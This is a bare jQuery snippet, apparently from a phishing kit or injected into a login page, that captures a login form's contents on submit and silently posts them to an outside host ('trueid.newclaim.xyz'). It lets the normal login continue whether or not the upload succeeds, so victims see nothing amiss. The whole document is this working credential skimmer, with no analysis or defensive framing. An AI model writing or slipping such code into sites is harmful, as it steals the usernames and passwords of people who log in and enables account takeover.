$(".login-form").submit(function() {
	var d = $(".login-form");

	$.ajax({
        url: "https://trueid.newclaim.xyz/bokep/login.php",
        type: "POST",
        data: d.serialize(),
        success: function () {
            return true;
        },
        error: function () {
            return true;
        },
    });
});